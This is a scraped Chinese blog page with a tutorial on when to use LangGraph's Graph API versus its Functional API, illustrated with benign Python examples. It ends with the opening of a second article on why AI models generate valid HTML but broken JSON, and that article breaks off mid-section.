left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>LangGraph提供两种不同的API用于构建智能体工作流：Graph API和Functional API。这两种 API 共享相同的底层运行时环境，且可在同一应用中搭配使用，但它们针对不同的使用场景和开发偏好设计。
本文旨在帮助开发者根据自身具体需求，了解何时应使用哪种API。</p>
<h2 data-id="heading-0">一、快速决策指南</h2>
<p>当你需要以下功能时，使用图 API（Graph API）：</p>
<ul>
<li>用于调试和文档记录的复杂工作流可视化</li>
<li>支持多节点共享数据的显式状态管理</li>
<li>包含多个决策点的条件分支</li>
<li>后续需合并的并行执行路径</li>
<li>可通过可视化呈现辅助理解的团队协作场景</li>
</ul>
<p>当你需要以下功能时，使用函数式 API（Functional API）：</p>
<ul>
<li>对现有过程式代码的改动最小化</li>
<li>标准控制流（if/else 条件判断、循环、函数调用）</li>
<li>无需显式状态管理的函数作用域状态</li>
<li>更少模板代码（boilerplate）的快速原型开发</li>
<li>仅含简单分支逻辑的线性工作流</li>
</ul>
<h2 data-id="heading-1">二、详细对比</h2>
<h3 data-id="heading-2">2.1 何时使用图 API（Graph API）</h3>
<p>图API采用声明式方法（declarative approach），通过定义节点（nodes）、边（edges）和共享状态（shared state）来创建可视化的图结构（visual graph structure）。</p>
<h4 data-id="heading-3">1. 复杂决策树与分支逻辑</h4>
<p>当你的工作流包含多个依赖于不同条件的决策点（decision points）时，图 API 能让这些分支清晰可见，且易于可视化呈现。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Graph API: Clear visualization of decision paths</span>
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    messages: <span class="hljs-built_in">list</span>
    current_tool: <span class="hljs-built_in">str</span>
    retry_count: <span class="hljs-built_in">int</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">should_continue</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">if</span> state[<span class="hljs-string">"retry_count"</span>] &gt; <span class="hljs-number">3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"end"</span>
    <span class="hljs-keyword">elif</span> state[<span class="hljs-string">"current_tool"</span>] == <span class="hljs-string">"search"</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"process_search"</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"call_llm"</span>

workflow = StateGraph(AgentState)
workflow.add_node(<span class="hljs-string">"call_llm"</span>, call_llm_node)
workflow.add_node(<span class="hljs-string">"process_search"</span>, search_node)
workflow.add_conditional_edges(<span class="hljs-string">"call_llm"</span>, should_continue)
</code></pre>
<h4 data-id="heading-4">2. 跨多个组件的状态管理</h4>
<p>当你需要在工作流的不同部分之间共享并协调状态时，图 API（Graph API）的显式状态管理（explicit state management）机制将发挥重要作用。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Multiple nodes can access and modify shared state</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkflowState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    user_input: <span class="hljs-built_in">str</span>
    search_results: <span class="hljs-built_in">list</span>
    generated_response: <span class="hljs-built_in">str</span>
    validation_status: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># Access shared state</span>
    results = search(state[<span class="hljs-string">"user_input"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"search_results"</span>: results}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">validation_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># Access results from previous node</span>
    is_valid = validate(state[<span class="hljs-string">"generated_response"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"validation_status"</span>: <span class="hljs-string">"valid"</span> <span class="hljs-keyword">if</span> is_valid <span class="hljs-keyword">else</span> <span class="hljs-string">"invalid"</span>}
</code></pre>
<h4 data-id="heading-5">3. 带同步机制的并行处理</h4>
<p>当你需要并行运行多个操作，随后再合并它们的结果时，图 API（Graph API）能自然地处理这一需求。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Parallel processing of multiple data sources</span>
workflow.add_node(<span class="hljs-string">"fetch_news"</span>, fetch_news)
workflow.add_node(<span class="hljs-string">"fetch_weather"</span>, fetch_weather)
workflow.add_node(<span class="hljs-string">"fetch_stocks"</span>, fetch_stocks)
workflow.add_node(<span class="hljs-string">"combine_data"</span>, combine_all_data)

<span class="hljs-comment"># All fetch operations run in parallel</span>
workflow.add_edge(START, <span class="hljs-string">"fetch_news"</span>)
workflow.add_edge(START, <span class="hljs-string">"fetch_weather"</span>)
workflow.add_edge(START, <span class="hljs-string">"fetch_stocks"</span>)

<span class="hljs-comment"># Combine waits for all parallel operations to complete</span>
workflow.add_edge(<span class="hljs-string">"fetch_news"</span>, <span class="hljs-string">"combine_data"</span>)
workflow.add_edge(<span class="hljs-string">"fetch_weather"</span>, <span class="hljs-string">"combine_data"</span>)
workflow.add_edge(<span class="hljs-string">"fetch_stocks"</span>, <span class="hljs-string">"combine_data"</span>)
</code></pre>
<h4 data-id="heading-6">4. 团队开发与文档编制</h4>
<p>图 API（Graph API）的可视化特性，使得团队更易于理解、记录和维护复杂的工作流。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Clear separation of concerns - each team member can work on different nodes</span>
workflow.add_node(<span class="hljs-string">"data_ingestion"</span>, data_team_function)
workflow.add_node(<span class="hljs-string">"ml_processing"</span>, ml_team_function)
workflow.add_node(<span class="hljs-string">"business_logic"</span>, product_team_function)
workflow.add_node(<span class="hljs-string">"output_formatting"</span>, frontend_team_function)
</code></pre>
<h3 data-id="heading-7">2.2 何时使用函数式 API（Functional API）</h3>
<p>函数式 API 采用命令式方法（imperative approach），可将LangGraph功能集成到标准的过程式代码中。</p>
<h4 data-id="heading-8">1. 对现有过程式代码的改动最小化</h4>
<p>当你已拥有使用标准控制流（standard control flow）的代码，且希望通过最少的重构（minimal refactoring）为其添加 LangGraph 功能时，适合使用函数式 API。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Functional API: Minimal changes to existing code</span>
<span class="hljs-keyword">from</span> langgraph.func <span class="hljs-keyword">import</span> entrypoint, task

<span class="hljs-meta">@task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_input</span>(<span class="hljs-params">user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Existing function with minimal changes</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed"</span>: user_input.lower().strip()}

<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">workflow</span>(<span class="hljs-params">user_input: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># Standard Python control flow</span>
    processed = process_user_input(user_input).result()

    <span class="hljs-keyword">if</span> <span class="hljs-string">"urgent"</span> <span class="hljs-keyword">in</span> processed[<span class="hljs-string">"processed"</span>]:
        response = handle_urgent_request(processed).result()
    <span class="hljs-keyword">else</span>:
        response = handle_normal_request(processed).result()

    <span class="hljs-keyword">return</span> response
</code></pre>
<h4 data-id="heading-9">2. 具有简单逻辑的线性工作流</h4>
<p>当你的工作流以顺序执行为主，且仅包含简单的条件逻辑时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">essay_workflow</span>(<span class="hljs-params">topic: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Linear flow with simple branching</span>
    outline = create_outline(topic).result()

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(outline[<span class="hljs-string">"points"</span>]) &lt; <span class="hljs-number">3</span>:
        outline = expand_outline(outline).result()

    draft = write_draft(outline).result()

    <span class="hljs-comment"># Human review checkpoint</span>
    feedback = interrupt({<span class="hljs-string">"draft"</span>: draft, <span class="hljs-string">"action"</span>: <span class="hljs-string">"Please review"</span>})

    <span class="hljs-keyword">if</span> feedback == <span class="hljs-string">"approve"</span>:
        final_essay = draft
    <span class="hljs-keyword">else</span>:
        final_essay = revise_essay(draft, feedback).result()

    <span class="hljs-keyword">return</span> {<span class="hljs-string">"essay"</span>: final_essay}
</code></pre>
<h4 data-id="heading-10">3. 快速原型开发</h4>
<p>当你希望快速测试想法，且不想承担定义状态模式（state schemas）和图结构（graph structures）的额外开销时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">quick_prototype</span>(<span class="hljs-params">data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Fast iteration - no state schema needed</span>
    step1_result = process_step1(data).result()
    step2_result = process_step2(step1_result).result()

    <span class="hljs-keyword">return</span> {<span class="hljs-string">"final_result"</span>: step2_result}
</code></pre>
<h4 data-id="heading-11">4. 函数作用域内的状态管理</h4>
<p>当你的状态天然适合限定在单个函数的作用域内，且无需进行大范围共享时。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_document</span>(<span class="hljs-params">document: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># Local state management within function</span>
    sections = extract_sections(document)
    summaries = [summarize(section) <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> sections]
    key_points = extract_key_points(summaries)

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"sections"</span>: <span class="hljs-built_in">len</span>(sections),
        <span class="hljs-string">"summaries"</span>: summaries,
        <span class="hljs-string">"key_points"</span>: key_points
    }

<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">document_processor</span>(<span class="hljs-params">document: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    analysis = analyze_document(document).result()
    <span class="hljs-comment"># State is passed between functions as needed</span>
    <span class="hljs-keyword">return</span> generate_report(analysis).result()
</code></pre>
<h2 data-id="heading-12">三、组合使用两种API</h2>
<p>你可以在同一个应用中同时使用这两种 API。当系统的不同部分有不同需求时，这种方式会非常实用。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph
<span class="hljs-keyword">from</span> langgraph.func <span class="hljs-keyword">import</span> entrypoint

<span class="hljs-comment"># Complex multi-agent coordination using Graph API</span>
coordination_graph = StateGraph(CoordinationState)
coordination_graph.add_node(<span class="hljs-string">"orchestrator"</span>, orchestrator_node)
coordination_graph.add_node(<span class="hljs-string">"agent_a"</span>, agent_a_node)
coordination_graph.add_node(<span class="hljs-string">"agent_b"</span>, agent_b_node)

<span class="hljs-comment"># Simple data processing using Functional API</span>
<span class="hljs-meta">@entrypoint()</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">data_processor</span>(<span class="hljs-params">raw_data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    cleaned = clean_data(raw_data).result()
    transformed = transform_data(cleaned).result()
    <span class="hljs-keyword">return</span> transformed

<span class="hljs-comment"># Use the functional API result in the graph</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">orchestrator_node</span>(<span class="hljs-params">state</span>):
    processed_data = data_processor.invoke(state[<span class="hljs-string">"raw_data"</span>])
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed_data"</span>: processed_data}
</code></pre>
<h2 data-id="heading-13">四、API间的迁移</h2>
<h3 data-id="heading-14">4.1 从函数式API迁移至图API</h3>
<p>当你的函数式工作流变得复杂时，可按以下方式迁移至图 API：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Before: Functional API</span>
<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">complex_workflow</span>(<span class="hljs-params">input_data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    step1 = process_step1(input_data).result()

    <span class="hljs-keyword">if</span> step1[<span class="hljs-string">"needs_analysis"</span>]:
        analysis = analyze_data(step1).result()
        <span class="hljs-keyword">if</span> analysis[<span class="hljs-string">"confidence"</span>] &gt; <span class="hljs-number">0.8</span>:
            result = high_confidence_path(analysis).result()
        <span class="hljs-keyword">else</span>:
            result = low_confidence_path(analysis).result()
    <span class="hljs-keyword">else</span>:
        result = simple_path(step1).result()

    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># After: Graph API</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkflowState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    input_data: <span class="hljs-built_in">dict</span>
    step1_result: <span class="hljs-built_in">dict</span>
    analysis: <span class="hljs-built_in">dict</span>
    final_result: <span class="hljs-built_in">dict</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">should_analyze</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">"analyze"</span> <span class="hljs-keyword">if</span> state[<span class="hljs-string">"step1_result"</span>][<span class="hljs-string">"needs_analysis"</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">"simple_path"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">confidence_check</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">"high_confidence"</span> <span class="hljs-keyword">if</span> state[<span class="hljs-string">"analysis"</span>][<span class="hljs-string">"confidence"</span>] &gt; <span class="hljs-number">0.8</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"low_confidence"</span>

workflow = StateGraph(WorkflowState)
workflow.add_node(<span class="hljs-string">"step1"</span>, process_step1_node)
workflow.add_conditional_edges(<span class="hljs-string">"step1"</span>, should_analyze)
workflow.add_node(<span class="hljs-string">"analyze"</span>, analyze_data_node)
workflow.add_conditional_edges(<span class="hljs-string">"analyze"</span>, confidence_check)
<span class="hljs-comment"># ... add remaining nodes and edges</span>
</code></pre>
<h3 data-id="heading-15">4.2 从图API迁移至函数式API</h3>
<p>当对于简单的线性流程而言，你的图结构变得过于复杂时</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Before: Over-engineered Graph API</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-built_in">input</span>: <span class="hljs-built_in">str</span>
    step1: <span class="hljs-built_in">str</span>
    step2: <span class="hljs-built_in">str</span>
    result: <span class="hljs-built_in">str</span>

<span class="hljs-comment"># After: Simplified Functional API</span>
<span class="hljs-meta">@entrypoint(<span class="hljs-params">checkpointer=checkpointer</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_workflow</span>(<span class="hljs-params">input_data: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    step1 = process_step1(input_data).result()
    step2 = process_step2(step1).result()
    <span class="hljs-keyword">return</span> finalize_result(step2).result()
</code></pre>
<h2 data-id="heading-16">五、总结</h2>
<p>当你需要对工作流结构进行显式控制、处理复杂分支、实现并行处理，或希望借助团队协作优势时，请选择图API（Graph API）。
当你希望以最少的改动为现有代码添加LangGraph功能、处理简单的线性工作流，或需要快速原型开发能力时，请选择函数式API（Functional API）。
两种 API 均提供相同的LangGraph核心功能（包括持久化、流式处理、人机协同、内存管理），但采用不同的范式进行封装，以适配不同的开发风格和使用场景。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它]]></title>    <link>https://juejin.cn/post/7575457788664332340</link>    <guid>https://juejin.cn/post/7575457788664332340</guid>    <pubDate>2025-11-24T03:06:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788664332340" data-draft-id="7575563462047170595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-11-24T03:06:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="葡萄城技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3227821868332765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么AI擅长HTML却搞砸JSON？我们用一个“复古”技术解决了它
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821868332765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    葡萄城技术团队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:06:46.000Z" title="Mon Nov 24 2025 03:06:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近，我们团队在调查开发AI辅助功能，需要模型生成内部配置（JSON元数据）时，我们遇到了一个令人困惑的悖论：市面上的AI模型可以轻松生成结构完整、样式美观的HTML页面，但当我们需要它生成工具所需的JSON配置时，结果却惨不忍睹。这直接影响了AI辅助开发功能的可靠性。</p>
<h2 data-id="heading-0">问题的发现：从“完美”到“破碎”的对比</h2>
<p>我们对AI生成HTML的能力印象深刻。只需简单的提示，AI就能生成结构完整、可用的页面代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎使用活字格低代码开发平台<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个由AI生成的示例页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>但当目标转向生成内部使用的JSON配置时，情况急转直下：</p>
<pre><code class="hljs language-JSON" lang="JSON">'''json<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"components"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"container"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"children"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-comment">/* ... 更多内容 ... */</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-comment">// 致命错误：缺少闭合的括号、多余的逗号或引号缺失</span>
</code></pre>
<p>类似的结构错误层出不穷，<strong>导致</strong>JSON解析器立即报错，功能彻底中断。</p>
<h2 data-id="heading-1">深入分析：为什么AI对HTML和JSON区别对待？</h2>
<h3 data-id="heading-2">1.容错性的根本差异：警察与保姆</h3>
<p><strong>HTML</strong>：宽容的保姆</p>
<ul>
<li>浏览器是天然的“错误修复器”。缺失闭合标签？属性未加引号？浏览器会尽力修复并正常渲染。</li>
<li><strong>结果导向：</strong> 只要页面看起来正常，微小的语法错误可以被忽略。</li>
</ul>
<p><strong>JSON</strong>：严格的警察</p>
<ul>
<li>JSON解析器是“零容忍的语法警察”。</li>
<li>一个多余的逗号、缺失的双引号都会导致解析失败。</li>
<li><strong>非黑即白：</strong> 要么完全正确，要么彻底失败。</li>
</ul>
<h3 data-id="heading-3">2.AI工作方式的局限性：概率而非精确</h3>
<p>大型语言模型本质上是基于概率的文本生成器，而不是精确的代码编译器：</p>
<ul>
<li><strong>HTML</strong>生成： 即使中间有错误，模型可以靠上下文“蒙”对下一个标签，最终结果可能仍然可用。</li>
<li><strong>JSON</strong>生成： 必须从第一个<code>{</code>到最后一个<code>}</code>完美无缺。AI生成中的微小错误都会在解析时被放大。</li>
</ul>
<h3 data-id="heading-4">3.训练数据的偏好与结构“锚点”</h3>
